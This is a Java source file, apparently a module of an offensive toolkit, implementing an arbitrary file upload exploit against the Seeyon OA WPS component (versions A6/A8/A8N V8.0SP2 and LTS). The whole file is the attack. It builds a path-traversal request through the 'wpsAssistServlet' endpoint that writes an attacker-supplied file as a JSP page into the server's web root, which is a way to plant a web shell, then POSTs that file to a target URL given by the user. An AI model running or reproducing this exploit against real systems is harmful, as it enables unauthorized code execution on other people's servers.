package com.droplab.Controller.Seeyon.Service;

import com.droplab.Utils.CommonUtils;
import com.droplab.Utils.HttpUtils;
import com.droplab.Utils.InfoUtils;
import com.droplab.service.BugService;
import org.jsoup.Connection;

import java.io.File;
import java.util.HashMap;
import java.util.Iterator;

/**
 * wps组件任意文件上传，适用版本  A6/A8/A8N_V8.0SP2&LTS
 */
public class WPSAssistServletUpload extends BugService {
    private final String contentPath = "/wpsAssistServlet?flag=save&realFileType=/../../../ApacheJetspeed/webapps/ROOT/%s.jsp&fileId=1";

    @Override
    public Object run(String type) {
        try {
            if (params.size() > 0) {
                String url = null;
                String filepath = null;
                String filename = null;
                Iterator<String> iterator = params.keySet().iterator();
                while (iterator.hasNext()) {
                    String key = iterator.next();
                    if (key.equals("url")) {
                        url = params.get(key);
                    } else if (key.equals("filepath")) {
                        filepath = params.get(key);
                    } else if (key.equals("filename")) {
                        filename = params.get(key);
                    }
                }
                if (!url.equals("") && url != null) {
                    HashMap headers = new HashMap();
                    CommonUtils.hashMapClone(InfoUtils.headers, headers);
                    headers.put("Referer", url);

                    HashMap fileMap = new HashMap();
                    fileMap.put("upload", new File(filepath));


                    String urlFinal = String.format(contentPath, filename);
                    Connection.Response response = HttpUtils.post(url + urlFinal, headers, null, fileMap);
                    return response;
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }
}
